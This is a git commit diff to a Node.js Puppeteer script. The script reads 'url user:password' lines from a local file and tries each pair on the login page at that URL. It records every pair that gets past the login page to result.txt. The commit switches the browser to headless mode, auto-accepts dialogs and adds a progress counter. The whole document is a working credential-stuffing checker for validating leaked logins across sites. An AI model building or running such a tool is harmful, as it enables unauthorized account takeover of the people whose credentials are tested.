a3e173dbd5b52437a6c8b4e3a34f6627135b61c2
Khoi nguyen <dangkhoi29mta@gmail.com>
2023-01-05 08:48:13 +0700

    done

--- index.js
+++ index.js
@@ -5,11 +5,14 @@ var array = fs
   .readFileSync('C:/Users/dangk/OneDrive/Desktop/ToolAdmin/loginapp/mail.txt')
   .toString()
   .split('\n')
-
+let index=0;
 let fullCheck = async () => {
+  
   try {
     for (i of array) {
       try {
+        index++;
+        console.log(index)
         let [url, dataLogin] = i.split(' ')
         let userName = dataLogin.split(':')[0]
         let password = dataLogin.split(':')[1]
@@ -22,14 +25,17 @@ let fullCheck = async () => {
 }
 fullCheck()
 async function Check(url, username, password) {
-  const browser = await puppeteer.launch({ headless: false })
+  const browser = await puppeteer.launch({ headless: true })
   try {
     const page = await browser.newPage()
+    page.on('dialog',async dialog=>{
+      await dialog.accept();
+    })
     await page.goto(url)
     // await page.waitForSelector('form')
     await page.type('input[type="text"]', username, { delay: 20 })
     await page.type('input[type="password"]', password, { delay: 20 })
-
+    
     await page.keyboard.press('Enter')
     try {
       await page.click('button')
@@ -41,7 +47,16 @@ async function Check(url, username, password) {
       !page.url().includes('Login') &&
       !page.url().includes('login')
     ) {
-      console.log(url, username, password)
+      try {
+        
+        fs.appendFile('./result.txt', `${url} ${username} ${password}`, function (err) {
+          if (err) return 
+          
+        });
+      } catch (error) {
+        
+      }
+      // console.log(url, username, password)
     }
     await browser.close()
   } catch (e) {
